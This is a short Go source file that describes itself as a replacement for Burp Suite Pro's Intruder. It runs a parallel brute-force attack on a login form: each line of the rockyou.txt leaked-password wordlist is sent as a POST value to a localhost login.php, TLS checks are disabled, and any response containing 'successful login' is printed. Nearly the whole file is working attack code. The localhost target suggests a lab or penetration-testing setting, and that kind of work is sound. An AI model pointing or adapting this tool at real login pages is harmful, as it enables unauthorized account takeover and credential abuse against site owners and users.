/* This is supposed to be a replacement for burpPro's intruder */

package main

import (
	"bufio"
        "fmt"
	"os"
	"net/http"
	"bytes"
	"crypto/tls"
	"io/ioutil"
	"strings"
)

const parallelism=10

func main(){

	file, _ := os.Open("rockyou.txt")
	defer file.Close()

	scanner := bufio.NewScanner(file)

  //run until the file ends
  for {
    //do one batch of requests
  	 for i := 1; i < parallelism; i++ {
	       if scanner.Scan() == true {
		  line :=scanner.Text()
		  go dorequest(line)
	       } else {return}
  	 }

     //wait for a response before starting next batch
     if scanner.Scan() == true {
          line :=scanner.Text()
          dorequest(line)
     } else {return}
   }
}

// manage responses here
func checkResponse(resp string, username string) {
    if strings.Contains(resp,"successful login"){
  	fmt.Println(resp + "  " + username)
    }
}

// does post request, set request headers and parameters here
func dorequest(username string){
	formData  := "username="+username


   //	proxy, _ :=url.Parse("http://127.0.0.1:8080")
	tr := &http.Transport{
			 TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
   //   Proxy: http.ProxyURL(proxy),
	 }

	client := &http.Client{Transport: tr}
	req, _ := http.NewRequest("POST", "http://127.0.0.1:8000/login.php", bytes.NewBuffer([]byte(formData)))
	req.Header.Add("Authorization", "Basic ThisIsSupposedToBeAPaidFeature==")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(req)
	if err != nil {
	      //fmt.Println(err)
	      return
	}
	bodyBytes, _ := ioutil.ReadAll(resp.Body)

	body := string(bodyBytes)
  	checkResponse(body, username)

	defer resp.Body.Close()
}
